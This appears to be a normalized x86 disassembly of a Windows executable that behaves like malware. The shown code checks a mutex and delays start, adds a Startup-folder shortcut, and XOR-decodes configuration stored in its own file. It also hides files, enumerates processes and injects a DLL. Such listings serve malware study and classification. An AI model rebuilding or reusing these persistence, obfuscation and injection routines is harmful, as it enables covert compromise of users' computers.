sub_401090
push ecx
mov al [ esp + 0x3 ]
push ebx
push esi
push edi
mov [ rw-data ] al
mov edi rw-data
or ecx 0xffffffff
xor eax eax
xor edx edx
xor esi esi
[ edi ]
not ecx
dec ecx
mov [ rw-data ] edx
mov ebx ecx
mov [ rw-data ] edx
cmp ebx 0xfffffffd
mov [ rw-data ] esi
jbe r-xdata
test edx edx
je r-xdata
call [ std::_Xlen@IAT ]
mov edx [ rw-data ]
mov esi [ rw-data ]
test ebx ebx
jne r-xdata
mov al [ edx - 0x1 ]
test al al
je r-xdata
cmp esi 0x1f
ja r-xdata
push 0x1
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
pop edi
pop esi
pop ebx
pop ecx
retn
cmp al 0xff
je r-xdata
push 0x1
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
cmp esi ebx
jae r-xdata
test ebx ebx
jne r-xdata
mov ecx ebx
mov edi edx
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
mov [ rw-data ] ebx
pop edi
pop esi
mov [ eax + ebx ] 0x0
pop ebx
pop ecx
retn
push ebx
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Copy@IAT ]
mov edx [ rw-data ]
dec al
push ebx
mov ecx rw-data
mov [ edx - 0x1 ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
pop edi
pop esi
pop ebx
pop ecx
retn
sub_401180
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
retn
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_402112
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_4011d0
sub esp 0x28
mov al [ esp + 0x3 ]
push ebx
push edi
push 0x0
lea ecx [ esp + 0x14 ]
mov [ esp + 0x14 ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov ebx [ Sleep@IAT ]
push 0x1388
call ebx
push rw-data
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
mov [ rw-data ] eax
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
lea edx [ esp + 0x20 ]
push edx
call sub_4015d0
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
add esp 0x4
mov edx [ ecx ]
lea ecx [ esp + 0x10 ]
push edx
push 0x0
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
push 0x1
lea ecx [ esp + 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov edi [ std::operator!=@IAT ]
lea eax [ esp + 0x10 ]
push rw-data
push eax
call edi
add esp 0x8
test al al
je r-xdata
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
push 0x1
lea ecx [ esp + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
lea ecx [ esp + 0x10 ]
push rw-data
lea edx [ esp + 0x24 ]
push ecx
push edx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
add esp 0xc
mov edx [ ecx ]
lea ecx [ esp + 0x10 ]
push edx
push 0x0
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
push 0x1
lea ecx [ esp + 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
push esi
mov esi [ sprintf@IAT ]
push eax
push rw-data
push rw-data
call esi
add esp 0xc
push rw-data
push rw-data
push rw-data
call esi
lea eax [ esp + 0x30 ]
push eax
call sub_401480
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
add esp 0x10
mov edx [ ecx ]
mov ecx rw-data
push edx
push 0x0
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
push 0x1
lea ecx [ esp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
push rw-data
push rw-data
call edi
add esp 0x8
test al al
je r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
mov edx [ std::cout@IAT ]
push rw-data
push edx
call [ std::operator<<@IAT ]
push eax
call [ std::endl@IAT ]
mov ecx [ esp + 0x24 ]
add esp 0xc
test ecx ecx
pop esi
je r-xdata
push rw-data
lea eax [ esp + 0x28 ]
push rw-data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
add esp 0xc
mov edx [ ecx ]
mov ecx rw-data
push edx
push 0x0
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
xor eax eax
pop edi
pop ebx
add esp 0x28
retn 0x10
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ std::cout@IAT ]
push rw-data
push eax
call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
push eax
call [ std::endl@IAT ]
mov eax [ rw-data ]
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_402112
add esp 0x4
xor eax eax
pop edi
pop ebx
add esp 0x28
retn 0x10
cmp al 0xff
je r-xdata
push eax
push rw-data
push rw-data
call esi
push rw-data
call sub_401c30
add esp 0x10
call sub_401890
push 0xa
mov [ esp + 0x14 ] 0x0
call ebx
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push 0x0
push sub_401b00
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ rw-data ] eax
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
push ecx
call sub_402112
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
xor eax eax
pop edi
pop ebx
add esp 0x28
retn 0x10
push 0x3e8
call ebx
jmp r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
sub_401480
sub esp 0x210
push ebx
push ebp
push esi
push edi
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x11c ]
xor esi esi
[ edi ]
mov ecx 0x41
lea edi [ esp + 0x18 ]
[ edi ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
push eax
push 0x7
push esi
mov [ esp + 0x1c ] esi
call [ SHGetSpecialFolderLocation@IAT ]
mov eax [ esp + 0x10 ]
cmp eax esi
je r-xdata
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0x8
lea ecx [ esp + 0x18 ]
push ecx
push eax
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x4 ]
cmp ecx esi
je r-xdata
call [ std::_Xlen@IAT ]
lea edx [ esp + 0x11c ]
push 0x104
lea eax [ esp + 0x1c ]
push edx
push eax
call [ GetShortPathNameA@IAT ]
jmp r-xdata
cmp ebx esi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x224 ]
[ edi ]
mov dl [ esp + 0x17 ]
mov [ ebp + 0x4 ] esi
not ecx
dec ecx
mov [ ebp ] dl
mov ebx ecx
mov [ ebp + 0x8 ] esi
cmp ebx 0xfffffffd
mov [ ebp + 0xc ] esi
jbe r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x210
retn
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
cmp eax ebx
jae r-xdata
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov eax ecx
lea esi [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x4 ]
pop edi
mov [ ebp + 0x8 ] ebx
pop esi
mov [ ebx + ecx ] 0x0
pop ebp
pop ebx
add esp 0x210
retn
push ebx
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Copy@IAT ]
dec al
push esi
mov [ ecx - 0x1 ] al
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x210
retn
sub_4015d0
sub esp 0x210
push ebx
push ebp
push esi
push edi
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x11c ]
xor ebx ebx
[ edi ]
mov ecx 0x41
lea edi [ esp + 0x18 ]
[ edi ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebx
push eax
push 0x1a
push ebx
mov [ esp + 0x1c ] ebx
call [ SHGetSpecialFolderLocation@IAT ]
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0x8
lea ecx [ esp + 0x18 ]
push ecx
push eax
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x4 ]
test ecx ecx
je r-xdata
call [ std::_Xlen@IAT ]
lea edx [ esp + 0x11c ]
push 0x104
lea eax [ esp + 0x1c ]
push edx
push eax
call [ GetShortPathNameA@IAT ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
mov ebp [ esp + 0x224 ]
and ecx 0x3
mov al [ esp + 0x17 ]
[ edi ] [ esi ]
mov [ ebp ] al
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ ebp + 0x4 ] ebx
mov [ ebp + 0x8 ] ebx
mov [ ebp + 0xc ] ebx
mov ebx ecx
cmp ebx 0xfffffffd
jbe r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x210
retn
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
cmp eax ebx
jae r-xdata
test ebx ebx
jne r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov edx ecx
lea esi [ esp + 0x18 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
pop edi
pop esi
mov [ ebx + eax ] 0x0
mov eax ebp
pop ebp
pop ebx
add esp 0x210
retn
push ebx
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Copy@IAT ]
dec al
push ebx
mov [ ecx - 0x1 ] al
mov ecx ebp
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x210
retn
sub_401750
sub esp 0x210
push esi
push 0x0
call [ CoInitialize@IAT ]
mov esi [ Sleep@IAT ]
push 0x64
call esi
lea eax [ esp + 0x4 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jge r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x218 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ esp + 0x4 ]
push 0x352
push eax
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
push ecx
push r--data
mov edx [ eax ]
push eax
call [ edx ]
test eax eax
jge r-xdata
xor eax eax
pop esi
add esp 0x210
retn
mov eax [ esp + 0x21c ]
lea edx [ esp + 0xc ]
push 0x104
push edx
push 0xffffffff
push eax
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
push 0x64
call esi
mov eax [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push 0x1
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ esp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ esp + 0x4 ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
call [ CoUninitialize@IAT ]
mov eax 0x1
pop esi
add esp 0x210
retn
xor eax eax
pop esi
add esp 0x210
retn
sub_401830
sub esp 0x24
mov ecx 0x9
xor eax eax
push esi
push edi
lea edi [ esp + 0x8 ]
push rw-data
[ edi ]
push rw-data
xor esi esi
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x8 ]
push edx
call [ GetSystemInfo@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
call eax
jmp r-xdata
pop edi
pop esi
add esp 0x24
retn
mov eax esi
cmp [ esp + 0x8 ] 0x9
mov eax 0x1
je r-xdata
sub_401890
sub esp 0x36c
push esi
push edi
mov ecx 0x10
xor eax eax
lea edi [ esp + 0x28 ]
mov esi [ sprintf@IAT ]
[ edi ]
mov [ esp + 0x54 ] ax
mov al 0x6f
mov [ esp + 0xa ] al
mov [ esp + 0xc ] al
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x270 ]
push eax
push ecx
mov [ esp + 0x2c ] 0x44
mov [ esp + 0x58 ] 0x1
mov [ esp + 0x10 ] 0x2d
mov [ esp + 0x11 ] 0x6e
mov [ esp + 0x13 ] 0x68
mov [ esp + 0x15 ] 0x6d
mov [ esp + 0x16 ] 0x65
call esi
add esp 0x8
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x16c ]
lea edx [ esp + 0x16c ]
push 0x104
[ edi ]
push edx
call [ GetWindowsDirectoryA@IAT ]
lea eax [ esp + 0x16c ]
push 0x3
lea ecx [ esp + 0x14 ]
push eax
push ecx
mov [ esp + 0x1c ] 0x0
call [ strncpy@IAT ]
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x74 ]
add esp 0xc
[ edi ]
call sub_401830
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x68 ]
push eax
push rw-data
push ecx
call esi
add esp 0xc
lea edx [ esp + 0x10 ]
push ebp
push edx
lea eax [ esp + 0x70 ]
push rw-data
push eax
call esi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x6c ]
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
pop ebp
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov edx [ esp + 0x1c ]
push 0x1388
mov [ rw-data ] edx
call [ Sleep@IAT ]
mov eax [ esp + 0x20 ]
push eax
push 0x0
call sub_401be0
mov ecx [ esp + 0x20 ]
mov esi [ CloseHandle@IAT ]
add esp 0x8
push ecx
call esi
mov edx [ esp + 0x14 ]
push edx
call esi
pop edi
mov eax 0x1
pop esi
add esp 0x36c
retn
pop edi
pop esi
add esp 0x36c
retn
mov eax [ std::cout@IAT ]
lea edx [ esp + 0x68 ]
push edx
push eax
call [ std::operator<<@IAT ]
push eax
call [ std::endl@IAT ]
add esp 0xc
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x270 ]
push ecx
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x88 ]
push eax
push ecx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
sub_401a50
sub esp 0x128
push ebx
push ebp
push esi
push edi
xor eax eax
mov ecx 0x49
lea edi [ esp + 0x14 ]
mov [ esp + 0x10 ] 0x0
push eax
push 0x2
[ edi ]
call CreateToolhelp32Snapshot
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x128
retn
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x128
push eax
push esi
call Process32First
test eax eax
je r-xdata
mov ebx [ esp + 0x13c ]
mov ebp [ _stricmp@IAT ]
mov edi [ Sleep@IAT ]
push 0xa
call edi
lea eax [ esp + 0x10 ]
push eax
push esi
call Process32Next
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ rw-data ]
cmp edx eax
je r-xdata
lea ecx [ esp + 0x34 ]
push ebx
push ecx
call ebp
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x128
retn
sub_401b00
sub esp 0x140
push ebx
mov ebx [ FindFirstFileA@IAT ]
push ebp
mov ebp [ UnmapDll@IAT ]
push esi
mov esi [ Sleep@IAT ]
push edi
mov edi [ SetFileAttributesA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
call ebx
cmp eax 0xffffffff
jne r-xdata
push rw-data
call sub_401c30
add esp 0x4
test eax eax
jne r-xdata
push 0xea60
call esi
jmp r-xdata
push rw-data
push rw-data
call sub_401750
mov eax [ rw-data ]
add esp 0x8
test eax eax
jne r-xdata
call ebp
mov eax [ g_bSubclassed@IAT ]
mov [ eax ] 0x0
call sub_401890
test eax eax
jne r-xdata
push 0x2710
call esi
jmp r-xdata
push rw-data
call sub_401a50
add esp 0x4
test eax eax
jne r-xdata
push 0x2
push eax
call edi
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
push rw-data
push rw-data
call sub_401750
mov eax [ rw-data ]
add esp 0x8
test eax eax
jne r-xdata
push 0x2710
call esi
jmp r-xdata
push 0x2
push eax
call edi
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
sub_401c00
push esi
mov esi [ esp + 0xc ]
xor ecx ecx
test esi esi
jle r-xdata
pop esi
retn
mov edx [ esp + 0x8 ]
inc ecx
cmp ecx esi
jl r-xdata
xor al 0x3e
mov [ ecx + edx ] al
mov al [ ecx + edx ]
test al al
je r-xdata
sub_401c30
sub esp 0x428
push ebx
push ebp
push esi
push edi
push rw-data
lea eax [ esp + 0xb0 ]
xor ebx ebx
push rw-data
push eax
mov [ esp + 0x30 ] ebx
mov [ esp + 0x28 ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x2c ] ebx
call [ sprintf@IAT ]
add esp 0xc
lea ecx [ esp + 0xac ]
push ebx
push 0x80
push 0x2
push ebx
push 0x3
push 0xc0000000
push ecx
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x428
retn
push eax
call [ CloseHandle@IAT ]
lea edx [ esp + 0x334 ]
push 0x104
push edx
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ esp + 0x334 ]
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x8
cmp esi ebx
je r-xdata
mov ecx 0x20
xor eax eax
lea edi [ esp + 0x1b0 ]
push ebx
mov ebx [ fseek@IAT ]
push 0x2b0
[ edi ]
push esi
call ebx
mov ebp [ fread@IAT ]
push esi
push 0x80
lea ecx [ esp + 0x1c4 ]
push 0x1
push ecx
call ebp
lea edx [ esp + 0x1cc ]
push 0x80
push edx
call sub_401c00
lea edi [ esp + 0x1d4 ]
or ecx 0xffffffff
xor eax eax
add esp 0x24
[ edi ]
not ecx
dec ecx
je r-xdata
mov ecx 0x41
lea edi [ esp + 0x230 ]
[ edi ]
mov edi [ sprintf@IAT ]
lea eax [ esp + 0x1b0 ]
push eax
lea ecx [ esp + 0x234 ]
push rw-data
push ecx
call edi
push 0x0
push 0x330
push esi
call ebx
push esi
push 0x2
lea edx [ esp + 0x44 ]
push 0x1
push edx
call ebp
mov eax [ esp + 0x4c ]
add esp 0x28
test eax eax
jle r-xdata
push 0x0
push 0x332
push esi
call ebx
push esi
push 0x2
lea eax [ esp + 0x30 ]
push 0x1
push eax
call ebp
mov eax [ esp + 0x38 ]
add esp 0x1c
test eax eax
jl r-xdata
push 0x0
push 0x334
push esi
call ebx
push esi
push 0x1
lea ecx [ esp + 0x28 ]
push 0x1
push ecx
call ebp
mov eax [ esp + 0x30 ]
add esp 0x1c
test eax eax
je r-xdata
push 0x0
push 0x399
push esi
call ebx
push esi
push 0x1
lea ecx [ esp + 0x3c ]
push 0x1
push ecx
call ebp
mov esi [ WritePrivateProfileStringA@IAT ]
add esp 0x1c
lea edx [ esp + 0xac ]
lea eax [ esp + 0x230 ]
push edx
push eax
push rw-data
push rw-data
call esi
mov ecx [ esp + 0x24 ]
lea edx [ esp + 0x10 ]
push ecx
xor ebx ebx
push rw-data
push edx
mov [ esp + 0x1c ] ebx
call edi
add esp 0xc
lea eax [ esp + 0xac ]
lea ecx [ esp + 0x10 ]
push eax
push ecx
push rw-data
push rw-data
call esi
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x10 ]
push edx
push rw-data
push eax
mov [ esp + 0x1c ] ebx
call edi
add esp 0xc
lea ecx [ esp + 0xac ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push rw-data
push rw-data
call esi
mov eax [ esp + 0x14 ]
cmp eax ebx
lea eax [ esp + 0xac ]
push eax
je r-xdata
xor eax eax
mov ecx 0x8
lea edi [ esp + 0x2c ]
push eax
push 0x335
push esi
[ edi ]
call ebx
push esi
push 0x20
lea edx [ esp + 0x40 ]
push 0x1
push edx
call ebp
lea eax [ esp + 0x48 ]
push 0x20
push eax
call sub_401c00
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
add esp 0x24
[ edi ]
not ecx
dec ecx
je r-xdata
push rw-data
push rw-data
push rw-data
push rw-data
push rw-data
call esi
lea ecx [ esp + 0xac ]
lea edx [ esp + 0x8c ]
push ecx
push edx
push rw-data
push rw-data
call esi
mov eax [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0x1c ] ebx
call edi
add esp 0xc
lea edx [ esp + 0xac ]
lea eax [ esp + 0x10 ]
push edx
push eax
push rw-data
push rw-data
call esi
lea ecx [ esp + 0xac ]
lea edx [ esp + 0x4c ]
push ecx
push edx
push rw-data
push rw-data
call esi
lea eax [ esp + 0xac ]
lea ecx [ esp + 0x6c ]
push eax
push ecx
push rw-data
push rw-data
call esi
mov edx [ esp + 0x20 ]
lea eax [ esp + 0x10 ]
push edx
push rw-data
push eax
mov [ esp + 0x1c ] ebx
call edi
add esp 0xc
lea ecx [ esp + 0xac ]
lea edx [ esp + 0x10 ]
push ecx
push edx
push rw-data
jmp r-xdata
mov ecx 0x8
lea edi [ esp + 0x8c ]
[ edi ]
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0x8c ]
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
push 0x0
push 0x355
push esi
call ebx
push esi
push 0x2
lea eax [ esp + 0x38 ]
push 0x1
push eax
call ebp
mov eax [ esp + 0x40 ]
add esp 0x28
test eax eax
jle r-xdata
lea edx [ esp + 0xac ]
push edx
push rw-data
lea ecx [ esp + 0xac ]
push ecx
push rw-data
jmp r-xdata
push rw-data
call esi
cmp [ esp + 0x28 ] ebx
je r-xdata
xor eax eax
mov ecx 0x8
lea edi [ esp + 0x2c ]
push eax
push 0x357
push esi
[ edi ]
call ebx
push esi
push 0x20
lea ecx [ esp + 0x40 ]
push 0x1
push ecx
call ebp
lea edx [ esp + 0x48 ]
push 0x20
push edx
call sub_401c00
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x70 ]
add esp 0x24
[ edi ]
lea eax [ esp + 0x2c ]
lea ecx [ esp + 0x4c ]
push eax
push rw-data
push ecx
call [ sprintf@IAT ]
xor eax eax
mov ecx 0x8
lea edi [ esp + 0x38 ]
push eax
push 0x377
push esi
[ edi ]
call ebx
push esi
push 0x20
lea edx [ esp + 0x4c ]
push 0x1
push edx
call ebp
lea eax [ esp + 0x54 ]
push 0x20
push eax
call sub_401c00
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x9c ]
add esp 0x30
[ edi ]
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0x6c ]
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
push 0x0
push 0x397
push esi
call ebx
push esi
push 0x2
lea eax [ esp + 0x40 ]
push 0x1
push eax
call ebp
mov eax [ esp + 0x48 ]
add esp 0x28
test eax eax
jl r-xdata
push rw-data
push rw-data
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x428
retn
mov edi [ sprintf@IAT ]
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4022f3
cmp [ rw-data ] ebx
jne r-xdata
call sub_4022de
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4022f0
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4011d0
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401000
call ??0Init@ios_base@std@@QAE@XZ
jmp sub_401020
??0Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::Init@IAT ]
sub_401020
push ??1Init@ios_base@std@@QAE@XZ
call sub_402156
pop ecx
retn
??1Init@ios_base@std@@QAE@XZ
mov ecx rw-data
jmp [ std::ios_base::Init::~Init@IAT ]
sub_401040
call ??0_Winit@std@@QAE@XZ
jmp sub_401060
??0_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::_Winit@IAT ]
sub_401060
push ??1_Winit@std@@QAE@XZ
call sub_402156
pop ecx
retn
??1_Winit@std@@QAE@XZ
mov ecx rw-data
jmp [ std::_Winit::~_Winit@IAT ]
sub_401080
call sub_401090
jmp sub_401170
sub_401170
push sub_401180
call sub_402156
pop ecx
retn
sub_401be0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call [ InjectDll@IAT ]
add esp 0x8
retn
Process32Next
